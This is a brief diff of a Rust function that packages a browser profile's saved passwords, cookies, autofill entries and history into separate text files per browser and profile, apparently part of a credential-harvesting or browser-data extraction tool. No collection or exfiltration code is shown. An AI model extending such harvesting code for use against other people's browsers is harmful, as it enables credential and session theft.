@@ -12,13 +12,15 @@ pub fn push_profile_bundle(
     history: Option<String>,
 ) {
     let base = format!("{browser}/{profile}");
-    results.push((format!("{base}/passwords.txt"), passwords.unwrap_or_default()));
-    results.push((
-        format!("{base}/cookies.txt"),
+    let contents = [
+        passwords.unwrap_or_default(),
         cookies.unwrap_or_else(|| super::netscape::empty_file()),
-    ));
-    results.push((format!("{base}/autofill.txt"), autofill.unwrap_or_default()));
-    results.push((format!("{base}/history.txt"), history.unwrap_or_default()));
+        autofill.unwrap_or_default(),
+        history.unwrap_or_default(),
+    ];
+    for (filename, content) in PROFILE_FILES.iter().zip(contents) {
+        results.push((format!("{base}/{filename}"), content));
+    }
 }
 
 pub fn sort_entries(files: &mut [(String, String)]) {
